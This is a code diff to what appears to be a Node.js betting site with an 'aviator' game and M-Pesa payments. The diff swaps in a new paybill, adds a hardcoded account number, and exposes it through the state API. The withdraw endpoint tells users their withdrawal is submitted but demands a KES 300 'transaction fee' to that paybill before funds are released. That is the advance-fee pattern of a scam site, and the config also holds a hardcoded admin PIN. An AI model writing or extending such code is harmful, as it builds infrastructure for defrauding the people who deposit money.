@@ -74,7 +74,8 @@ const memoryStore = {
   },
   siteConfig: {
     adminPin: "290290",
-    paybill: "290290",
+    paybill: "522522",
+    accountNumber: "6234870026939877",
     minDeposit: 10.0,
     minWithdrawal: 1000.0,
     bonusAmount: 500.0,
@@ -153,6 +154,7 @@ app.get('/api/state', (req, res) => {
     aviator: memoryStore.aviator,
     siteConfig: {
       paybill: memoryStore.siteConfig.paybill,
+      accountNumber: memoryStore.siteConfig.accountNumber,
       minDeposit: memoryStore.siteConfig.minDeposit,
       minWithdrawal: memoryStore.siteConfig.minWithdrawal,
       bonusAmount: memoryStore.siteConfig.bonusAmount,
@@ -360,7 +362,7 @@ app.post('/api/withdraw', (req, res) => {
   res.json({
     success: true,
     notice: "Notice: Your account has reached KES 1,000! Please add KES 300 for transaction fee to complete your M-Pesa disbursement.",
-    message: `Withdrawal request of KES ${withdrawAmt.toFixed(0)} submitted! Please add KES 300 transaction fee via Paybill 290290 to release funds.`,
+    message: `Withdrawal request of KES ${withdrawAmt.toFixed(0)} submitted! Please add KES 300 transaction fee via Paybill 522522 (Account: 6234870026939877) to release funds.`,
     balance: user.balance,
     reference: txRef
   });
